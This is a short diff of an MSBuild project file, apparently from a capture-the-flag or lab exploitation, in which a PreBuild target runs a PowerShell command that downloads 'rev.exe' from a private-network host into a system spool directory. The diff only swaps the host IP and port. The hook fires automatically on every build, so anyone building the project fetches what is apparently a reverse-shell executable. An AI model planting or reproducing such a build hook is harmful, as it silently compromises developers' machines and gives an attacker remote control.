@@ -8,7 +8,7 @@
   </PropertyGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell -c iwr -Uri http://10.10.16.56:8000/rev.exe -Outfile C:/windows/system32/spool/drivers/color/rev.exe" />
+    <Exec Command="powershell -c iwr -Uri http://10.10.16.79:9001/rev.exe -Outfile C:/windows/system32/spool/drivers/color/rev.exe" />
   </Target>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
